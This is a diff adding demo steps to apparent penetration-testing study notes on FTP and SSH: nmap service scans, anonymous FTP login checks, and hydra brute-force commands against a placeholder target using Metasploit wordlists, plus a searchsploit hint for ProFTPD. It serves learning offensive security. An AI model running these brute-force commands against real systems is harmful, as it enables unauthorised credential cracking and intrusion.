@@ -96,18 +96,22 @@ How do we exploit this vulnerability in metasploit?
 
 --- demo - --
 
-
-
-
-
-
-
-
-
-
-
-
-
+- perform nmap service scan 
+- check if anonymous access is configured: 
+	- ftp ip 
+	- name: anonymous password: anonymous
+	- when login failed anonymous login is not enabled 
+- check is anonymous access if possible via nmap script 
+	- command to search only for nmap script for ftp: ls -al /usr/share/nmap/script/ | grep ftp-* 
+- bruteforce ftp: 
+	- hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt targetip -t 4 ftp 
+		- This option specifies the number of parallel tasks to be executed simultaneously. In this case, it is set to 4, meaning that Hydra will attempt to crack passwords using four parallel connections
+	- start ftp and use username and password found in bruteforce attack 
+	
+	other option is to run searchsploit query on version of ftp found in nmap scan 
+		- searchsploit allows you to search for exploits in exploit DB database 
+			- exploit ProFTPD 
+			
 
 
 
@@ -130,6 +134,30 @@ How do we exploit this vulnerability in metasploit?
     - Username and password authentication
     - Key-based authentication
 - In the case of username and password authentication, a brute-force attack can be attempted on the SSH server to discover valid credentials and gain access to the target system.
+
+
+-- demo -- 
+- perform nmap service scan 
+- perform bruteforce attack: 
+	- hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt targetip -t 4 ssh 
+	- 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 ## Exploiting SAMBA 
